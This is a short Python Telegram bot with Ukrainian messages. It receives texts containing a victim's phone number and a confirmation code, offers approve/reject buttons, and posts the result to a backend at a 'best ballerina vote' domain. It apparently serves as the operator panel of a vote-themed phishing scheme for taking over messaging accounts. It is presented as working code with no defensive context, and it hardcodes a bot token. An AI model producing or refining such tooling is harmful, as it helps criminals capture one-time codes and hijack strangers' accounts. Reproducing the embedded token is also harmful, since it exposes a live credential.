import telebot
import requests
import re
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = '7738348678:AAE5mirY6jzmApYyAjJ5PQgz-1_G8u9pJ6g'
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(func=lambda m: "Код підтвердження:" in m.text)
def handle_code(m):
    phone_match = re.search(r"Телефон:\s*([+\d]+)", m.text)
    phone = phone_match.group(1) if phone_match else "невідомий"

    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("✅ Так", callback_data=f"confirm_yes_{phone}"),
        InlineKeyboardButton("❌ Ні", callback_data=f"confirm_no_{phone}")
    )
    bot.send_message(m.chat.id, f"{m.text}\n\nПідтвердити ці дані?", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    try:
        data = call.data
        if "confirm_yes_" in data:
            phone = data.replace("confirm_yes_", "")
            status = "approved"
        elif "confirm_no_" in data:
            phone = data.replace("confirm_no_", "")
            status = "rejected"
        else:
            bot.send_message(call.message.chat.id, "⚠️ Некоректний формат даних")
            return

        # надсилаємо на бекенд
        requests.post("https://api.bestballerinarvote.com/user-request", json={
            "phone": phone,
            "result": status
        })
        bot.send_message(call.message.chat.id, f"✅ Дані прийняті: {status}")
    except Exception as e:
        bot.send_message(call.message.chat.id, f"⚠️ Помилка бекенду: {e}")

bot.infinity_polling()
